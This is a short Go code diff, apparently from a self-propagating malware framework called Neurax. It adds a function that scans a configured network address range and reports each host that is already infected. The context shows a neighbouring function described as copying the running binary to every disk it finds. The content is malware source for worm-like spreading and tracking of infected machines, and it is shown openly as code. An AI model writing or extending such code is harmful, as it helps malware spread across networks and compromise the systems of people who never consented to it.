@@ -505,6 +505,15 @@ func NeuraxScan(c chan string) {
 	}
 }
 
+func NeuraxScanInfected(c chan string) {
+	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.Cidr)
+	for _, addr := range full_addr_range {
+		if IsHostInfected(addr) {
+			c <- addr
+		}
+	}
+}
+
 //Copies current binary to all found disks
 func NeuraxDisks() error {
 	selected_name := gen_haiku()
